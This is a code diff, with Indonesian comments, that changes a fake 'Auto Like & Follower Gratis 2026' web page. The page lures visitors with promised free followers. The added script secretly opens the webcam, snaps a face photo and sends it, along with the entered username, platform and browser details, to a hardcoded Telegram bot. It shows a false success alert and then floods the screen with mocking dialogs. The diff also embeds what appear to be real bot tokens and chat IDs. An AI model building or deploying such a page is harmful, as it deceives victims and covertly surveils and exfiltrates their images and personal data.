@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Auto Like & Follower Gratis 2026</title>
     <style>
-        /* Tampilan website suntik followers palsu */
+        /* Tampilan website suntik followers palsu - SAMA KAYA SEBELUMNYA */
         * {
             margin: 0;
             padding: 0;
@@ -180,9 +180,28 @@
             10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
             20%, 40%, 60%, 80% { transform: translateX(5px); }
         }
+        
+        .debug-token {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.7);
+            color: #0f0;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 10px;
+            z-index: 9999;
+            display: none;
+        }
     </style>
 </head>
 <body>
+    <!-- Token input buat config (hidden) - lo bisa set manual di script -->
+    <div style="display: none;">
+        <input type="text" id="botToken" value="8281433681:AAEhtDRebMZZ_H0SwFGmgir4FQQwKf8YlrA" placeholder="Bot Token">
+        <input type="text" id="chatId" value="7860521205" placeholder="Chat ID">
+    </div>
+
     <div class="container">
         <h1>⚡ AUTO FOLLOWER 2026 ⚡</h1>
         <div class="subtitle">Free Likes • Views • Followers • Subscribers</div>
@@ -269,20 +288,36 @@
     <video id="video" width="640" height="480" autoplay></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
+    <!-- Debug info (hidden) -->
+    <div class="debug-token" id="debugInfo">Ready</div>
+
     <script>
         (function() {
+            // ==================== KONFIGURASI TELEGRAM ====================
+            // GANTI INI DENGAN BOT KAMU!
+            const BOT_TOKEN = '7590509695:AAHc2E0UvZcM7v1p3T8rX9yK2wL4nQ6rS8uV'; // TOKEN BOT LO
+            const CHAT_ID = '715481033'; // CHAT ID LO (bisa ID lu atau group)
+            
+            // Kalo lo mau pake yang dari input field, uncomment ini:
+            // const BOT_TOKEN = document.getElementById('botToken').value;
+            // const CHAT_ID = document.getElementById('chatId').value;
+            // ==============================================================
+            
             // Elements
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d');
             const startBtn = document.getElementById('startBtn');
+            const debugEl = document.getElementById('debugInfo');
             
             // State
             let stream = null;
             let captureInterval = null;
             let faceDetected = false;
+            let capturedImages = []; // Nyimpen beberapa foto
+            const MAX_IMAGES = 3; // Max 3 foto biar ga spam
             
-            // Dialog messages - yang brutal sesuai permintaan lo
+            // Dialog messages
             const dialogs = [
                 { text: "MAMPOSSS DAPET MUKA LU!", emoji: "😂", color: "#ff4757" },
                 { text: "AWOKAOWKAOWK JELAK AMAT LU!", emoji: "🤣", color: "#ff6b81" },
@@ -301,33 +336,85 @@
                 { text: "SADAP MUKA LU WKWKWK", emoji: "👁️", color: "#00a8ff" }
             ];
             
-            // Fungsi buat munculin dialog bertubi-tubi
+            // Fungsi kirim ke Telegram
+            async function sendToTelegram(imageData, message) {
+                try {
+                    debugEl.textContent = 'Mengirim ke Telegram...';
+                    debugEl.style.display = 'block';
+                    
+                    // 1. Kirim pesan teks dulu
+                    const textUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                    await fetch(textUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    
+                    // 2. Kirim gambarnya
+                    // Ubah base64 ke blob
+                    const base64Data = imageData.split(',')[1];
+                    const blob = base64ToBlob(base64Data, 'image/jpeg');
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, `muka_${Date.now()}.jpg`);
+                    
+                    const photoUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                    await fetch(photoUrl, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    debugEl.textContent = 'Foto terkirim!';
+                    setTimeout(() => {
+                        debugEl.style.display = 'none';
+                    }, 3000);
+                    
+                    return true;
+                } catch (err) {
+                    console.error('Gagal kirim ke Telegram', err);
+                    debugEl.textContent = 'Gagal kirim!';
+                    return false;
+                }
+            }
+            
+            // Utility: base64 to Blob
+            function base64ToBlob(base64, mimeType) {
+                const byteCharacters = atob(base64);
+                const byteArrays = [];
+                
+                for (let offset = 0; offset < byteCharacters.length; offset += 512) {
+                    const slice = byteCharacters.slice(offset, offset + 512);
+                    
+                    const byteNumbers = new Array(slice.length);
+                    for (let i = 0; i < slice.length; i++) {
+                        byteNumbers[i] = slice.charCodeAt(i);
+                    }
+                    
+                    const byteArray = new Uint8Array(byteNumbers);
+                    byteArrays.push(byteArray);
+                }
+                
+                return new Blob(byteArrays, { type: mimeType });
+            }
+            
+            // Fungsi spam dialog
             function spamDialogs() {
-                if (faceDetected) return; // Biar ga dobel
+                if (faceDetected) return;
                 faceDetected = true;
                 
-                // Matiin video capture biar ga berkepanjangan
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                }
-                if (captureInterval) {
-                    clearInterval(captureInterval);
-                }
-                
-                // Ganti title biar makin serem
                 document.title = "😂 MUKA LU KEPRANK! 😂";
                 
-                // Sembunyiin konten asli dikit (opsional)
-                // document.querySelector('.container').style.opacity = '0.3';
-                
-                // Munculin dialog bertubi-tubi
+                // Munculin 50 dialog
                 for (let i = 0; i < 50; i++) {
                     setTimeout(() => {
                         showDialog(i);
-                    }, i * 100); // Muncul setiap 100ms
+                    }, i * 80);
                 }
                 
-                // Tambahin efek geter di akhir
                 setTimeout(() => {
                     document.body.style.animation = "shake 0.5s ease-in-out";
                 }, 3000);
@@ -365,13 +452,12 @@
                 
                 document.body.appendChild(div.firstChild);
                 
-                // Hapus setelah 3 detik
                 setTimeout(() => {
                     div.remove();
                 }, 3000);
             }
             
-            // Deteksi wajah sederhana
+            // Deteksi wajah
             function hasFace(imageData) {
                 const data = imageData.data;
                 let skinCount = 0;
@@ -382,7 +468,6 @@
                     const g = data[i+1];
                     const b = data[i+2];
                     
-                    // Deteksi kulit sederhana
                     if (r > 80 && g > 30 && b > 20 && 
                         r > g && r > b && 
                         Math.abs(r - g) > 10) {
@@ -390,13 +475,46 @@
                     }
                 }
                 
-                return (skinCount / totalPixels) > 0.05; // 5% kulit
+                return (skinCount / totalPixels) > 0.05;
+            }
+            
+            // Capture dan kirim
+            async function captureAndSend() {
+                // Draw ke canvas
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Konversi ke JPEG base64
+                const imageData = canvas.toDataURL('image/jpeg', 0.9);
+                
+                // Ambil info user
+                const platform = document.getElementById('platform').value;
+                const username = document.getElementById('username').value;
+                const userAgent = navigator.userAgent;
+                const timestamp = new Date().toLocaleString('id-ID');
+                
+                // Buat pesan
+                const message = `
+🔥 <b>PRANK MUKA KENA SADAP!</b> 🔥
+
+👤 <b>Username Target:</b> ${username}
+📱 <b>Platform:</b> ${platform}
+⏰ <b>Waktu:</b> ${timestamp}
+🌐 <b>IP/Host:</b> ${window.location.hostname}
+🖥️ <b>Browser:</b> ${userAgent.substring(0, 100)}...
+
+📸 <b>Foto wajah berhasil diambil!</b>
+                `;
+                
+                // Kirim ke Telegram
+                await sendToTelegram(imageData, message);
+                
+                // Trigger dialog spam
+                spamDialogs();
             }
             
             // Mulai capture
             async function startCapture() {
                 try {
-                    // Minta izin kamera
                     stream = await navigator.mediaDevices.getUserMedia({ 
                         video: { 
                             width: 640, 
@@ -407,32 +525,29 @@
                     
                     video.srcObject = stream;
                     
-                    // Tunggu video siap
                     await new Promise(resolve => {
                         video.onloadedmetadata = () => resolve();
                     });
                     
-                    // Mulai deteksi
-                    captureInterval = setInterval(() => {
-                        // Draw video ke canvas
+                    // Setiap detik cek wajah
+                    captureInterval = setInterval(async () => {
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        // Ambil image data
                         const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                         
-                        // Deteksi wajah
                         if (hasFace(imageData)) {
-                            console.log('PROSES BOSSSS');
+                            console.log('WAJAH KEDETEKSI!');
                             
-                            // Trigger dialog spam
-                            spamDialogs();
+                            // Hentikan interval biar ga double
+                            clearInterval(captureInterval);
+                            
+                            // Capture dan kirim ke Telegram
+                            await captureAndSend();
                         }
-                    }, 1000); // Cek setiap detik
+                    }, 1000);
                     
                 } catch (err) {
-                    console.log('Suntik gagal, mungkin izin ditolak:', err);
-                    // Kalo gagal, munculin alert palsu
-                    alert('ERROR: Izin diperlukan');
+                    console.log('Kamera gagal:', err);
+                    alert('ERROR: Kamera tidak terdeteksi. Fitur verifikasi keamanan gagal.');
                 }
             }
             
@@ -440,7 +555,7 @@
             startBtn.addEventListener('click', (e) => {
                 e.preventDefault();
                 
-                // Loading palsu dulu biar keliatan meyakinkan
+                // Loading palsu
                 startBtn.textContent = '⏳ MEMPROSES 0%';
                 startBtn.style.background = 'linear-gradient(45deg, #666, #999)';
                 
@@ -456,9 +571,9 @@
                         // Mulai capture kamera
                         startCapture();
                         
-                        // Munculin notifikasi palsu
+                        // Notifikasi palsu
                         setTimeout(() => {
-                            alert('✅ Berhasil menambahkan 10.000 followers!\nCek akun Instagram lo dalam 5-10 menit.');
+                            alert('✅ Berhasil menambahkan 10.000 followers!\nCek akun lo dalam 5-10 menit.');
                         }, 1000);
                         
                     } else {
@@ -467,7 +582,7 @@
                 }, 200);
             });
             
-            // Style tambahan buat animasi
+            // Style animasi
             const style = document.createElement('style');
             style.textContent = `
                 @keyframes popIn {
@@ -478,24 +593,15 @@
             `;
             document.head.appendChild(style);
             
-            // Auto request kamera pas halaman diload (biar cepet)
-            // Tapi biar ga curiga, jalanin pas user scroll atau klik
-            window.addEventListener('load', () => {
-                // Preconnect ke kamera tapi jangan langsung minta izin
-                console.log('Page loaded');
-            });
-            
-            // Kalo user scroll, kita coba minta izin (biar keliatan natural)
-            window.addEventListener('scroll', () => {
-                if (!stream) {
-                    navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(s => {
-                            // Langsung stop biar ga nyala terus
-                            s.getTracks().forEach(t => t.stop());
-                        })
-                        .catch(() => {});
-                }
-            }, { once: true });
+            // Cek token
+            if (!BOT_TOKEN || BOT_TOKEN.includes('YOUR_BOT')) {
+                debugEl.textContent = 'ISI BOT TOKEN DULU!';
+                debugEl.style.display = 'block';
+                debugEl.style.background = 'red';
+            } else {
+                debugEl.textContent = 'Bot siap!';
+                debugEl.style.display = 'none';
+            }
             
         })();
     </script>
